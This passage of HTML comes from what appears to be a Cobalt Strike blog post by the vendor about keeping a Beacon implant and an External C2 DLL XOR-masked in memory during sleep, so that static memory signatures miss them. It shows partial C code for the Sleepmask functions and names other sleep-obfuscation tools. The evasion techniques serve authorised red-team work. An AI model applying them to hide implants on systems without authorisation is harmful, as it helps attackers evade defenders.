<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_36906" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_36906_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_36906" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="keyword bold">void</code> <code class="plain">ExternalC2Sleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">[...SNIP...]</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Signal External C2 DLL to wait</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">DLOGF(</code><code class="string">"SLEEPMASK: ExtC2Sleep - Set Stop event\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">SetEvent(((PEXTC2_SYNC_INFO)customUserData)-&gt;ExtC2StopEvent);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">[...SNIP...]</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">DLOGF(</code><code class="string">"SLEEPMASK: ExtC2Sleep - Waiting for External C2 thread to sleep...\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">DWORD</code> <code class="plain">waitStatus = WaitForSingleObject(((PEXTC2_SYNC_INFO)customUserData)-&gt;ExtC2SleepEvent, 30000);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(waitStatus == WAIT_OBJECT_0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">DLOGF(</code><code class="string">"SLEEPMASK: ExtC2Sleep - External C2 thread sleeping\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">/* </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* A small sleep before masking to ensure the External C2 thread</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>16</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* is in the waiting state.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>17</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">*/</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>18</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">Sleep(500);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>19</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>20</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Mask External C2 DLL</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>21</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">DLOGF(</code><code class="string">"SLEEPMASK: ExtC2Sleep - Masking... \n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>22</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">XORSections(extC2Memory, info-&gt;beacon_info.mask, TRUE);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>23</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>24</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Sleep</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>25</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">Sleep(3000);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>26</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>27</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// UnMask External C2 DLL</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>28</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">DLOGF(</code><code class="string">"SLEEPMASK: ExtC2Sleep - Unmasking... \n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>29</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">XORSections(extC2Memory, info-&gt;beacon_info.mask, FALSE);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>30</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>31</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">DLOGF(</code><code class="string">"SLEEPMASK: ExtC2Sleep - Set Continue event\n"</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>32</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">SetEvent(((PEXTC2_SYNC_INFO)customUserData)-&gt;ExtC2ContinueEvent);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>33</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>34</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">[...SNIP...]</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>35</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>36</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div></div></div></div>


<p><code>ExternalC2Sleep()</code> is called from within the Sleepmask’s <code>PivotSleep()</code> function shown below. This makes it possible to keep Beacon masked and continuously mask/unmask the External C2 DLL whilst it waits to receive data.&nbsp;</p>


<div class="wp-block-syntaxhighlighter-code "><div id="highlighter_448712" class="syntaxhighlighter  "><div class="bar"><div class="toolbar"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource" title="view source" class="item viewSource" style="width: 16px; height: 16px;">view source</a><div class="item copyToClipboard"><embed width="16" height="16" id="highlighter_448712_clipboard" type="application/x-shockwave-flash" title="copy to clipboard" allowscriptaccess="always" wmode="transparent" flashvars="highlighterId=highlighter_448712" menu="false" src="https://www.cobaltstrike.com/app/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf"></div><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource" title="print" class="item printSource" style="width: 16px; height: 16px;">print</a><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about" title="?" class="item about" style="width: 16px; height: 16px;">?</a></div></div><div class="lines no-wrap"><div class="line alt1"><table><tbody><tr><td class="number"><code>1</code></td><td class="content"><code class="keyword bold">void</code> <code class="plain">PivotSleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>2</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">[...SNIP...]</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>3</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>4</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Check whether the Beacon is an extc2-loader Beacon</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>5</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">EXTC2_DLL_STATE externalC2Dll = GetExternalC2DllState(info, customUserData);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>6</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>7</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">[...SNIP...]</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>8</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">else</code> <code class="keyword bold">if</code> <code class="plain">(action == ACTION_PIPE_PEEK) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>9</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="color1 bold">DWORD</code> <code class="plain">dataAvailable = 0;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>10</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>11</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">// Wait for data to be available on our pipe.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>12</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">while</code> <code class="plain">(TRUE) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>13</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(!PeekNamedPipe(pivotArguments.pipe, NULL, 0, NULL, &amp;dataAvailable, NULL)) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>14</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">break</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>15</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>16</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>17</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(dataAvailable &gt; 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>18</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">break</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>19</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>20</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>21</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">if</code> <code class="plain">(externalC2Dll == EXTC2_DLL_INITIALIZED) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>22</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">ExternalC2Sleep(info, customUserData);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>23</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>24</code></td><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>25</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">/**</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>26</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* A small Sleep between checking the pipe for data</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>27</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* for default pivot Sleep and also gives the External C2</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>28</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">* client time to process any requests after waking up.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>29</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="comments">*/</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>30</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">Sleep(500);</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>31</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>32</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="number"><code>33</code></td><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword bold">return</code><code class="plain">; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="number"><code>34</code></td><td class="content"><code class="plain">}</code></td></tr></tbody></table></div></div></div></div>


<p>After executing our payload, we can see in ProcessHacker that whilst our memory is <code>RWX</code> (it is an example), it has all been sufficiently masked to avoid simple static signatures.</p>



<p class="has-small-font-size"><em><strong>Note:</strong> As part of this example we have not discussed <a href="https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm" target="_blank" rel="noreferrer noopener">masking the Sleepmask itself which is a common target for signatures</a>. However, it would be possible to replace the <code>ExternalC2Sleep()</code> function’s call to <code>Sleep()</code> with <a href="https://github.com/JLospinoso/gargoyle" target="_blank" rel="noreferrer noopener">Gargoyle</a>/ <a href="https://github.com/realoriginal/foliage" target="_blank" rel="noreferrer noopener">Foliage</a>/ <a href="https://github.com/Cracked5pider/Ekko" target="_blank" rel="noreferrer noopener">Ekko</a>/ <a href="https://github.com/thefLink/DeepSleep" target="_blank" rel="noreferrer noopener">Deep Sleep</a> etc as required.</em></p>



<figure class="wp-block-image size-large"><img fetchpriority="high" decoding="async" width="1024" height="644" src="https://www.cobaltstrike.com/app/uploads/2024/08/screenshot_process-hacker_beacon-extc2-dll-masked-1-1024x644.png" alt="" class="wp-image-6297"></figure>



<p class="has-small-font-size"><em><strong>Note:</strong> You may also be wondering why the start of the hex dump of the two DLLs looks the same. This is because we used the same key to mask both DLLs (<code>sleepmaskinfo-&gt;maskKey</code>) and we’re seeing the masked DOS/PE header. The key passed to the Sleepmask is randomly generated which will likely be sufficient. However, it would also be trivial to use different keys.&nbsp;&nbsp;</em></p>



<h2 class="wp-block-heading">Conclusion</h2>



<p>That brings us to the end of this post, we hope that this has demonstrated the power of the UDRL and the Sleepmask and their central role in Cobalt Strike’s evasion strategy. We also hope it has demonstrated why users should start to think of the UDRL and the Sleepmask together and ways in which they can interoperate to create more advanced capabilities.</p>



<p>The code shown here is now available in the UDRL-VS library in the Arsenal Kit. To try it out, simply open the solution and compile the Release build of both the extc2-loader and extc2-dll. You can then load the <code>./bin/extc2-loader/prepend-udrl.cna</code> script into the Cobalt Strike console and export an artefact.</p>

</div><!-- .entry-content -->

<!-- .entry-footer -->

</article><!-- #post-6252 -->


				</main>
			</div> <!-- #primary -->
			
<div class="col-lg-4 align-self-start resource-sidebar widget-area"><!-- #resource-sidebar -->
        <div class="sidebar-content bg-7 mb-3">
        <div class=" container">
            <div class="row">
                <div class="col-12">
                                    <div class="author-description p-3 row">
                                                <div class="author-image col-5">
                             <img width="226" height="229" src="https://www.cobaltstrike.com/app/uploads/2023/09/Cobalt-author-photo.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy">                        </div>
                                                <div class=" col-7 pl-0">
                            <h4 class="author-title text-align-left font-weight-light">
                                <a href="https://www.cobaltstrike.com/profile/robert-bearsby">Robert Bearsby</a>
                            </h4>
                            <div>Senior Cybersecurity Researcher</div>
                        </div>
                        <div class="col-12 text-center mt-2">
                            <a class=" btn-link view-profile" href="https://www.cobaltstrike.com/profile/robert-bearsby">View Profile</a>
                        </div>
                    </div>
                                </div>  <!-- #column -->
            </div> <!-- #row -->
        </div> <!-- #container -->
    </div>  <!-- #sidebar-content -->
            <div class="sidebar-content bg-7 mb-3">
        <div class=" container">
            <div class="row">
                <div class="col-12">
                                            <div class="sidebar-content p-3">
                            <div class="block-title text-uppercase">
                            RELATED PRODUCTS
                            </div>
                            <ul class="list-group list-group-flush pt-2">
                            <li class="list-unstyled"><a href="https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data" title="Cobalt Strike">Cobalt Strike</a></li>                            </ul>
                        </div>
                                                                <div class="sidebar-content p-3">
                            <div class="block-title text-uppercase">
                            TOPICS
                            </div>
                            <ul class="list-group list-group-flush pt-2">
                            <li class="list-unstyled"><a href="https://www.cobaltstrike.com/blog?_sft_cornerstone=development" title="Development">Development</a></li><li class="list-unstyled"><a href="https://www.cobaltstrike.com/blog?_sft_cornerstone=red-team" title="Red Team">Red Team</a></li>                            </ul>
                        </div>
                                    </div>  <!-- #column -->
            </div> <!-- #row -->
        </div> <!-- #container -->
    </div>  <!-- #sidebar-content -->
    </div><!-- #resource-sidebar -->
		</div><!-- .row -->
	</div><!-- #container -->
</div><!-- #page-wrapper -->



</div>



<div class="wpc-filters-overlay"></div>








<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
<div class="ta-display-none" name="trustarc_notice" id="trustarcNoticeFrame" title="Trustarc Cross-Domain Consent Frame" src="https://consent.trustarc.com/get?name=crossdomain.html&amp;domain=helpsystems.com" data-original-tag="iframe"></div></body></html>